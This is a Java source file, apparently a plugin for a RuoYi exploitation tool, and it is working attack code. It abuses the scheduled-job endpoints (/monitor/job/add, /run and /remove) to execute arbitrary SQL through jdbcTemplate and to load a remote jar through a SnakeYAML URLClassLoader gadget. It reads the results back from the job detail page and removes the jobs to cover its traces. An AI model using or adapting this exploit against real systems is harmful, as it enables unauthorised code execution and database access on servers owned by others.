package com.ruoyi.ruoyigui.exploit;

import com.ruoyi.ruoyigui.common.BasePayload;
import com.ruoyi.ruoyigui.entity.Result;
import com.ruoyi.ruoyigui.util.CustomHttpClient;
import com.ruoyi.ruoyigui.util.Tools;

import java.util.Random;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ruoyi_job_jdbc_template implements BasePayload {
    @Override
    public Result checkVUL(String url) throws Exception {
        Random random = new Random();
        int randomNumber = 100 + random.nextInt(201);
        String vul_uri = url + "/monitor/job/add";
        String payload = "createBy=admin&jobId=" + randomNumber + "&jobName=test222&jobGroup=DEFAULT&invokeTarget=jdbcTemplate.execute('select user()')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=";
        String remove_vul_effect_uri = url + "/monitor/job/remove";
        String remove_vul_effect_payload = "ids=" + randomNumber;

        try {
            CustomHttpClient req = new CustomHttpClient();
            CustomHttpClient.HttpResponse res = req.post(vul_uri, payload);
            if (res.getBody().contains("操作成功")) {
                req.post(remove_vul_effect_uri, remove_vul_effect_payload);
                return new Result(true, "Ruoyi job jdbc template漏洞", "[Snakeyaml漏洞(bypass)]\nURI:" + vul_uri + "\nDATA:" + payload);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new Result(false, "Ruoyi job jdbc template漏洞", null);
    }

    @Override
    public Result exeVUL(String url, String cmd) throws Exception {
        String result;
        if (cmd.contains(".jar") || cmd.contains(".rar")) {
            Random random = new Random();
            int randomNumber = 900 + random.nextInt(201);
            String vul_uri = url + "/monitor/job/add";
            String payload = "createBy=admin&jobId=" + randomNumber + "&jobName=test222&jobGroup=DEFAULT&invokeTarget=jdbcTemplate.execute('update sys_job set invoke_target=0x" + Tools.string2HexString("org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"" + cmd + "\"]]]]')") + " where job_id=" + randomNumber + ";')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=";

            String vul_url_run = url + "/monitor/job/run";
            String payload1 = "jobId=" + randomNumber;

            CustomHttpClient req = new CustomHttpClient();
            String res = req.post(vul_uri, payload).getBody();
            if (res.contains("操作成功")) {
                req.post(vul_url_run, payload1);
                req.post(vul_url_run, payload1);
                req.post(vul_url_run, payload1);
                req.post(vul_url_run, payload1);
                String res1 = req.post(vul_url_run, payload1).getBody();
                if (res1.contains("操作成功")) {
                    return new Result(true, null, "加载成功");
                }
            }
        } else {
            Random random = new Random();
            int randomNumber = 100 + random.nextInt(201);
            //添加
            String vul_uri = url + "/monitor/job/add";
            String remove_vul_effect_uri = url + "/monitor/job/remove";
            String payload = "createBy=admin&jobId=" + randomNumber + "&jobName=test222&jobGroup=DEFAULT&invokeTarget=jdbcTemplate.execute('set @a6=0x" + Tools.string2HexString("update sys_job set invoke_target=(" + cmd + ") where job_id=" + randomNumber) + "')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=";
            String vul_url_run = url + "/monitor/job/run";
            String payload1 = "jobId=" + randomNumber;
            //赋值
            int randomNumber1 = 300 + random.nextInt(201);
            String payload3 = "createBy=admin&jobId=" + randomNumber1 + "&jobName=test222&jobGroup=DEFAULT&invokeTarget=jdbcTemplate.execute('prepare stmt from @a6')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=";
            String payload4 = "jobId=" + randomNumber1;

            //执行回显
            int randomNumber2 = 500 + random.nextInt(201);
            String payload5 = "createBy=admin&jobId=" + randomNumber2 + "&jobName=test222&jobGroup=DEFAULT&invokeTarget=jdbcTemplate.execute('execute stmt')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=";
            String payload6 = "jobId=" + randomNumber2;

            String invokeTargetPatternStr = "调用目标字符串：[\\w\\W]*?div class=\"form-control-static\">(.*?)</div>";
            String job_detail_uri = url + "/monitor/job/detail/" + randomNumber;


            CustomHttpClient req = new CustomHttpClient();
            String res = req.post(vul_uri, payload).getBody();
            if (res.contains("操作成功")) {
                req.post(vul_url_run, payload1);
                req.post(vul_url_run, payload1);
                req.post(vul_url_run, payload1);
                req.post(vul_url_run, payload1);
                String res1 = req.post(vul_url_run, payload1).getBody();
                if (res1.contains("操作成功")) {
                    String res2 = req.post(vul_uri, payload3).getBody();
                    if (res2.contains("操作成功")) {
                        req.post(vul_url_run, payload4);
                        req.post(vul_url_run, payload4);
                        req.post(vul_url_run, payload4);
                        req.post(vul_url_run, payload4);
                        String res3 = req.post(vul_url_run, payload4).getBody();
                        if (res3.contains("操作成功")) {
                            String res4 = req.post(vul_uri, payload5).getBody();
                            if (res4.contains("操作成功")) {
                                req.post(vul_url_run, payload6);
                                req.post(vul_url_run, payload6);
                                req.post(vul_url_run, payload6);
                                req.post(vul_url_run, payload6);
                                String res5 = req.post(vul_url_run, payload6).getBody();
                                if (res5.contains("操作成功")) {
                                    String res6;
                                    int maxRetries = 20;
                                    int attempt = 0;
                                    do {
                                        res6 = req.get(job_detail_uri).getBody();
                                        attempt++;

                                        if (attempt >= maxRetries) {
                                            break;
                                        }
                                        TimeUnit.SECONDS.sleep(1);
                                    } while (res6.contains("jdbcTemplate.execute"));
                                    Pattern invokeTargetPattern = Pattern.compile(invokeTargetPatternStr);
                                    Matcher matcher = invokeTargetPattern.matcher(res6);

                                    if (matcher.find()) {
                                        result = "执行成功" + matcher.group(1);

                                        //删除计划任务
                                        req.post(remove_vul_effect_uri, "ids=" + randomNumber);
                                        req.post(remove_vul_effect_uri, "ids=" + randomNumber1);
                                        req.post(remove_vul_effect_uri, "ids=" + randomNumber2);
                                        if (!result.contains("set")) {
                                            return new Result(true, null, result);
                                        } else {
                                            return new Result(false, null, null);
                                        }
                                    } else {
                                        req.post(remove_vul_effect_uri, "ids=" + randomNumber);
                                        req.post(remove_vul_effect_uri, "ids=" + randomNumber1);
                                        req.post(remove_vul_effect_uri, "ids=" + randomNumber2);
                                        return new Result(false, null, null);
                                    }
                                }
                            }
                        }
                    }

                }
            }

        }


        return new Result(false, null, null);
    }

    @Override
    public Result getShell(String url) throws Exception {
        return new Result(false, null, null);
    }
}
